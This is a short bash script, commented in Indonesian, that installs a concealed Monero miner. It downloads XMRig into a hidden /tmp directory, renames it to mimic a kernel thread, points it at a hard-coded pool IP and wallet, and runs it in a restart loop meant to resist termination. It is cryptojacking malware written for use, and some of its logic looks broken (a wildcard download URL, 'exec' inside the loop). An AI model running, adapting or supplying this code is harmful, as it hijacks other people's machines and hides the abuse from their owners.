#!/bin/bash

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="159.65.167.171:443"
WORKER_ID="syslog"
TLS=true
FAKE_NAME="kworker/u8:2"  # Nama palsu proses agar mirip sistem
TMP_DIR="/tmp/.sysd"      # Direktori kerja tersembunyi

# === SIAPKAN DIREKTORI KERJA ===
mkdir -p "$TMP_DIR"
cd "$TMP_DIR" || exit

# === UNDUH XMRIG JIKA BELUM ADA ===
if [ ! -f "./$FAKE_NAME" ]; then
  echo "[*] Mengunduh XMRig..."
  wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-static-x64.tar.gz -O xmrig.tar.gz
  tar -xf xmrig.tar.gz
  DIR=$(tar -tf xmrig.tar.gz | head -1 | cut -f1 -d"/")
  mv "$DIR/xmrig" "./$FAKE_NAME"
  chmod +x "$FAKE_NAME"
  rm -rf "$DIR" xmrig.tar.gz
fi

# === BUAT CONFIG TERSEMBUNYI ===
cat > config.json <<EOF
{
  "autosave": false,
  "cpu": true,
  "opencl": false,
  "cuda": false,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER_ID",
      "keepalive": true,
      "tls": $TLS
    }
  ]
}
EOF

# === JALANKAN DALAM LOOP ANTI-DISMISS DENGAN PENYAMARAN ===
while true; do
  echo "[*] Menjalankan proses sebagai '$FAKE_NAME'..."
  exec -a "$FAKE_NAME" "./$FAKE_NAME" --config=config.json
  echo "[!] Proses keluar. Restart 5 detik..."
  sleep 5
done
